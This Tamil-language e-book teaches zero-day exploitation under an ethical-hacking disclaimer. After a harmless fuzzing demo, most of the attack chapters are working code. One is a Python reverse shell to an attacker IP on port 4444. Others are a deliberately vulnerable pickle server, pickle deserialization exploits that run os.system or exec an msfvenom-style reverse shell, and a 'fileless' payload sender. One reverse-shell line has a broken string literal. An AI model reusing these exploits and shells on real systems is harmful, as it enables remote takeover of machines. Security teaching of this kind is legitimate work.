ஜீரோ-டே (Zero-Day) எக்ஸ்புளாயிட்டேஷன் கலைக்களஞ்சியம்

நெறிமுறை ஹேக்கிங், மெமரி அனாலிசிஸ் மற்றும் இன்-மெமரி கோப்பற்ற தாக்குதல்கள்

⚠️ முக்கிய சட்ட மற்றும் பாதுகாப்பு அறிவிப்பு:

இந்த மின்-புத்தகம் முழுக்க முழுக்க நெறிமுறை ஹேக்கிங் (Ethical Hacking) மற்றும் கணினி பாதுகாப்பு கல்வி ஆராய்ச்சி நோக்கங்களுக்காக மட்டுமே உருவாக்கப்பட்டுள்ளது. தகுந்த அனுமதியின்றி எந்தவொரு கணினியையோ, அப்ளிகேஷனையோ தாக்குவது கடுமையான சட்டவிரோத குற்றமாகும். இதில் உள்ள குறியீடுகளை உங்களின் சொந்த லேப் சூழலில் (Isolated Lab Environment) மட்டுமே சோதிக்க வேண்டும்.

அத்தியாயம் 1: ஜீரோ-டே (Zero-Day) அடிப்படை தத்துவங்கள்

ஒரு மென்பொருள் (Software), இயக்க முறைமை (OS), அல்லது சர்வரில் உள்ள, இதுவரை அதன் தயாரிப்பாளருக்கோ அல்லது பொதுமக்களுக்கோ தெரியாத ஒரு பாதுகாப்பு குறைபாடே ஜீரோ-டே (Zero-Day Vulnerability) எனப்படும்.

மென்பொருள் தயாரிப்பு நிறுவனத்திற்கு இந்த ஆபத்தான குறைபாட்டை சரிசெய்ய (Patch செய்ய) '0' நாட்கள் அவகாசமே இருந்தது என்பதால் இப்பெயர் பெற்றது. ஒரு தீங்கிழைக்கும் ஹேக்கர் இந்த குறைபாட்டைப் பயன்படுத்தி தாக்கும் போது அது Zero-Day Attack என்றும், அதற்குப் பயன்படுத்தப்படும் ஸ்கிரிப்ட் அல்லது நிரல் Zero-Day Exploit என்றும் அழைக்கப்படுகிறது. நெறிமுறை பென்டெஸ்டர்கள் இவற்றை முன்கூட்டியே கண்டறிந்து நிறுவனங்களுக்கு புகாரளித்து உலகைப் பாதுகாக்கிறார்கள்.

அத்தியாயம் 2: பாதிப்புகளைக் கண்டறியும் மேம்பட்ட நுட்பங்கள்

பாதுகாப்பு ஆராய்ச்சியாளர்கள் மற்றும் நெறிமுறை ஹேக்கர்கள் ஒரு கணினியில் உள்ள மறைமுக குறைபாடுகளைக் கண்டறிய மூன்று முதன்மை வழிகளைப் பயன்படுத்துகின்றனர்:

அ) ஃபஸ்ஸிங் (Fuzzing / Fuzz Testing)

இது ஒரு தானியங்கி (Automated) சோதனை முறையாகும். ஒரு மென்பொருளின் இன்புட் பாக்ஸ் அல்லது நெட்வொர்க் போர்ட்டிற்கு பல்லாயிரக்கணக்கான தவறான, சிதைக்கப்பட்ட அல்லது எதிர்பாராத தரவுகளை (Malformed Inputs) அனுப்பி சோதிப்பதே ஃபஸ்ஸிங் ஆகும். மென்பொருள் செயலிழக்கும் போது (Crash), அங்கு பாதுகாப்பு குறைபாடு கண்டறியப்படுகிறது.

ஆ) மூல குறியீடு ஆய்வு (Source Code Review)

மென்பொருளின் முழுமையான குறியீட்டை (Source Code) கைமுறையாகவோ அல்லது கருவிகள் (SAST Tools) மூலமாகவோ வரி வரியாக படித்து பகுப்பாய்வு செய்வது. பாதுகாப்பற்ற செயல்பாடுகள் (Insecure Functions) மற்றும் தர்க்க பிழைகளை (Logical Flaws) இதன் மூலம் கண்டறியலாம்.

இ) ரிவர்ஸ் இன்ஜினியரிங் (Reverse Engineering)

பல நேரங்களில் மென்பொருளின் மூல குறியீடு நமக்குக் கிடைக்காது. அதுபோன்ற சூழல்களில், அதன் பைனரி கோப்புகளை (EXE அல்லது ELF) Ghidra அல்லது IDA Pro போன்ற டூல்களைப் பயன்படுத்தி அசெம்பிளி கோடாக மாற்றி, அது எவ்வாறு இயங்குகிறது என்பதை ஆராய்ந்து குறைபாடுகளைக் கண்டறிவதாகும்.

அத்தியாயம் 3: ஃபஸ்ஸிங் டெமோ (Fuzzing) மற்றும் லேப் சோதனைகள்

ஒரு ஃபஸ்ஸர் (Fuzzer) எவ்வாறு ஒரு குறிப்பிட்ட சரியான தரவை எடுத்துக்கொண்டு, அதில் சீரற்ற முறையில் மாற்றங்களை (Mutations) ஏற்படுத்தி கணினியைச் சோதிக்கிறது என்பதற்கான மாதிரி பைத்தான் குறியீடு இதோ:

import random

# 1. சரியான தரவு மாதிரி (Seed Input)
valid_input = "USER admin\nPASS secret123\n"

def mutate_data(data):
    """தரவை சீரற்ற முறையில் மாற்றி சிதைக்கும் செயல்பாடு"""
    data_list = list(data)
    num_mutations = random.randint(1, 5)
    
    for _ in range(num_mutations):
        pos = random.randint(0, len(data_list) - 1)
        # அந்த இடத்தில் ஒரு சீரற்ற விசித்திரமான குறியீட்டைச் சேர்த்தல்
        data_list[pos] = chr(random.randint(32, 126))
        
    return "".join(data_list)

# 2. ஃபஸ்ஸிங் லூப் (Fuzzing Loop)
print("[*] Fuzzing சோதனை தொடங்குகிறது...")
for i in range(1, 6):
    fuzzed_payload = mutate_data(valid_input)
    print(f"\n[சோதனை #{i}] அனுப்பப்படும் தரவு:")
    print(repr(fuzzed_payload))

அத்தியாயம் 4: மெமரி பகுப்பாய்வு மற்றும் டீபக்கிங் (Debugging)

ஃபஸ்ஸிங் மூலம் ஒரு அப்ளிகேஷன் உடையும் போது (Crash ஆகும் போது), ரேமிற்குள் (RAM) என்ன நடந்தது என்பதைத் தெரிந்துகொள்ள Immunity Debugger (Windows) அல்லது GDB (Linux) போன்ற டீபக்கர் டூல்கள் பயன்படுகின்றன.

டீபக்கிங்கின் முக்கிய நிலைகள்:

  • EIP (Extended Instruction Pointer) கட்டுப்பாட்டைப் பெறுதல்: கணினியில் அடுத்து எந்த மெமரி முகவரியில் உள்ள கட்டளை இயங்க வேண்டும் என்பதை தீர்மானிக்கும் மிக முக்கியமான ரெஜிஸ்டர் EIP ஆகும். எக்ஸ்புளாயிட்டேஷனின் போது இந்த EIP-ஐ நமது கட்டுப்பாட்டிற்குள் கொண்டு வர வேண்டும்.
  • Bad Characters கண்டறிதல்: நமது பேலோடில் (Payload) எந்தெந்த எழுத்துக்கள் அல்லது பைட்டுகள் (எடுத்துக்காட்டாக: \x00 - Null Byte) மென்பொருளால் நிராகரிக்கப்பட்டு எக்ஸ்புளாயிட்டை முடக்குகின்றன என்று கண்டறிந்து அவற்றை நீக்க வேண்டும்.

அத்தியாயம் 5: ரிவர்ஸ் ஷெல் (Reverse Shell) கட்டமைப்பு மற்றும் இயக்கம்

பாதிப்பைப் பயன்படுத்திய பிறகு, பாதிக்கப்பட்ட கணினி (Victim) தனது முனையக் கட்டுப்பாட்டை (Terminal / Command Prompt) ஹேக்கரின் கணினிக்குத் (Attacker) தானாகவே திருப்பி அனுப்பும் முறையே Reverse Shell ஆகும். இது ஃபயர்வால்களை (Firewalls) ஏமாற்றப் பயன்படுகிறது.

கீழே உள்ளது இலக்கு கணினியில் எக்ஸ்புளாயிட் மூலம் இயக்கப்படும் ஒரு எளிய ரிவர்ஸ் ஷெல் மாதிரி குறியீடு:

import socket
import subprocess
import os

ATTACKER_IP = "192.168.1.50"  # ஹேக்கரின் ஐபி முகவரி
ATTACKER_PORT = 4444          # ஹேக்கரின் லிசனிங் போர்ட்

def connect_back():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        # இன்புட் மற்றும் அவுட்புட்டை சாக்கெட்டிற்கு திருப்பி விடுதல்
        os.dup2(s.fileno(), 0) # stdin
        os.dup2(s.fileno(), 1) # stdout
        os.dup2(s.fileno(), 2) # stderr
        # லினக்ஸ் டெர்மினலை இயக்குதல்
        subprocess.call(["/bin/sh", -i"])
    except Exception:
        pass

அத்தியாயம் 6: நிஜ உலக டெமோ: பழைய பைத்தான் பதிப்பு குறைபாடு (Insecure Deserialization)

இங்கு நாம் பழைய பைத்தான் பதிப்புகளில் காணப்படும் பாதுகாப்பற்ற டீசீரியலைசேஷன் (Insecure Deserialization) குறைபாட்டை அடிப்படையாகக் கொண்ட லேப் மாதிரியைக் காண்போம். இதில் பயனரிடமிருந்து வரும் pickle தரவு சரிபார்க்கப்படாமல் ஏற்கப்படுகிறது.

அ) பாதிக்கப்பட்ட சர்வர் (Victim Server)

# victim_server.py
import socket
import pickle

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 5000))
    server.listen(1)
    print("[*] பாதிக்கப்பட்ட சர்வர் Port 5000 இல் இயங்குகிறது...")
    
    while True:
        client, addr = server.accept()
        try:
            data = client.recv(4096)
            # அபாயகரமான பகுதி: சரிபார்க்காமல் தரவை டீசீரியலைஸ் செய்தல்
            vulnerable_data = pickle.loads(data)
            print("[*] தரவு பிரிக்கப்பட்டது.")
        except Exception as e:
            print(f"[-] பிழை: {e}")
        finally:
            client.close()

if __name__ == "__main__":
    start_server()

ஆ) தாக்குதல் முறை 1: தனிப்பயன் பேலோடு (Non-MSF Attack)

மெட்டாஸ்பிளாயிட் இல்லாமல் பைத்தானின் reduce செயல்பாட்டைப் பயன்படுத்தி சர்வரில் தன்னிச்சையான கமாண்டுகளை இயக்குதல்:

# custom_attacker.py
import socket
import pickle
import os

class MaliciousPayload(object):
    def __reduce__(self):
        # சர்வர் இந்தத் தரவை பிரிக்கும் போது இந்த கமாண்ட் இயங்கும்
        command = "echo 'Hacked by Ethical Guide' > /tmp/proof.txt"
        return (os.system, (command,))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 5000))
s.send(pickle.dumps(MaliciousPayload()))
s.close()
print("[+] Non-MSF பேலோடு அனுப்பப்பட்டது!")

இ) தாக்குதல் முறை 2: மெட்டாஸ்பிளாயிட் பேலோடு (MSF Tool Attack)

பென்டெஸ்டிங்கில் msfvenom மூலம் உருவாக்கப்பட்ட ரிவர்ஸ் ஷெல்லையும் இந்த குறைபாட்டின் வழியாகச் செலுத்த முடியும். முதலில் ஹேக்கர் msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw மூலம் குறியீட்டைப் பெறுவார்.

# msf_attacker.py
import socket
import pickle

# MSFVenom மூலம் உருவாக்கப்பட்ட உண்மையான ரிவர்ஸ் ஷெல் மாதிரி
msf_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"

class MSFPayload(object):
    def __reduce__(self):
        return (exec, (msf_code,))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 5000))
s.send(pickle.dumps(MSFPayload()))
s.close()
print("[+] MSF பேலோடு வெற்றிகரமாக அனுப்பப்பட்டது!")

அத்தியாயம் 7: கோப்பற்ற (Fileless) இன்-மெமரி தாக்குதல் முறை

என்ன (What is it?)

நவீன பாதுகாப்பு அமைப்புகள் (Antivirus/EDR) கணினியின் வன்வட்டில் (Hard Drive) எழுதப்படும் புதிய தீங்கிழைக்கும் கோப்புகளை உடனே கண்டறிந்துவிடும். இதனை ஏமாற்ற, வன்வட்டில் எந்தவொரு கோப்பையும் உருவாக்காமல், நேரடியாக கணினியின் நினைவகத்தில் (RAM) மட்டுமே எக்ஸ்புளாயிட் செய்யும் முறைக்கு கோப்பற்ற தாக்குதல் (Fileless In-Memory Attack) என்று பெயர்.

எப்படி (How it works?)

அட்டாக்கர் சர்வருக்கு எந்தவொரு எக்ஸ்புளாயிட் கோப்பையும் அனுப்ப மாட்டார். மாறாக, அப்ளிகேஷனில் ஏற்கனவே இருக்கும் உள்விதிமுறைகள் அல்லது செயல்பாடுகளைப் (Built-in Dynamic Functions, எ.கா: eval(), exec()) பயன்படுத்தி, நினைவகத்திலேயே தன்னிச்சையான கமாண்டுகளை இயக்குவார்.

நேரடி டெமோ தாக்குதல் (Demo Tool Attack - No Payload File)

பிரபலமான அப்ளிகேஷன்களின் குறைபாடுகளைப் பயன்படுத்தி, அட்டாக்கர் தனது சொந்த டூலின் மூலம் நினைவகத்திலேயே கமாண்ட் எக்ஸிகியூட் செய்யும் மாதிரி குறியீடு:

# custom_fileless_tool.py
import socket

def launch_fileless_attack():
    target_ip = "127.0.0.1"
    target_port = 6379 # பிரபலமான சர்வர் போர்ட் மாதிரி
    
    # கோப்பற்ற இன்-மெமரி பேலோடு (In-Memory Fileless Payload)
    # இது வட்டில் எந்த கோப்பையும் உருவாக்காமல் RAM-இல் நேரடியாக இயங்கும்
    memory_payload = "import('os').popen('whoami && uname -a').read()"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        print("[*] நினைவகப் பேலோடு நேரடியாக அனுப்பப்படுகிறது...")
        s.send(memory_payload.encode('utf-8'))
        
        # சர்வர் மெமரியில் இயங்கித் திருப்பி அனுப்பும் பதிலை நேரடியாகப் பெறுதல்
        result = s.recv(4096).decode('utf-8')
        print("\n[+] சர்வர் நினைவகிலிருந்து பெறப்பட்ட நேரடி விடை:")
        print(result)
        s.close()
    except Exception as e:
        print(f"[-] தாக்குதல் தோல்வி: {e}")

if __name__ == "__main__":
    launch_fileless_attack()

அத்தியாயம் 8: பிரபலமான பழைய அப்ளிகேஷன் குறைபாடுகள் (CVEகள்) & இணைய ஆதாரங்கள்

மேலே நாம் விவாதித்த இன்-மெமரி மற்றும் கோப்பற்ற தாக்குதல் முறைகள் நிஜ உலகில் எந்தெந்த பிரபலமான மென்பொருட்களைப் பாதித்தன என்பதற்கான வரலாற்றுச் சிறப்புமிக்க CVE சான்றுகள் மற்றும் அதிகாரப்பூர்வ இணைய ஆதாரங்கள் (Web Sources) கீழே இணைக்கப்பட்டுள்ளன:

1. CVE-2022-0543 (Redis Lua Sandbox Escape):

பிரபலமான Redis மென்பொருளின் நினைவகத்தில் உள்ள Lua Interpreter-ஐ ஏமாற்றி, எந்த கோப்பும் இன்றி நேரடியாக RAM-இல் ரிமோட் கோட் எக்ஸிகியூட் (RCE) செய்யப்பட்ட மிகப்பெரிய பாதிப்பு.

🌐 அதிகாரப்பூர்வ ஆதாரம்: NVD CVE-2022-0543 (NIST)

2. CVE-2021-44228 (Log4j / Log4Shell):

உலகையே உலுக்கிய வெப் சர்வர் குறைபாடு. ஒரு எளிய உரை செய்தி (Text Message) மூலம் சர்வர் நினைவகத்திலேயே ஜாவா குறியீடுகளை (Java Objects) இயக்கி சர்வர்களை ஹேக்கர்கள் கட்டுப்பாட்டில் எடுத்தனர்.

🌐 அதிகாரப்பூர்வ ஆதாரம்: Mitre Log4Shell Reference

3. CVE-2020-14882 (Oracle WebLogic Server RCE):

பிரபலமான வெப்லாஜிக் வெப் சர்வரில் எந்தவொரு கோப்பு பேலோடும் இன்றி, வெறும் HTTP கெட் ரெக்வஸ்ட் (HTTP GET Request) மூலமாகவே நினைவகத்தில் கமாண்டுகளை இயக்கிய குறைபாடு.

🌐 அதிகாரப்பூர்வ ஆதாரம்: NVD CVE-2020-14882 (NIST)
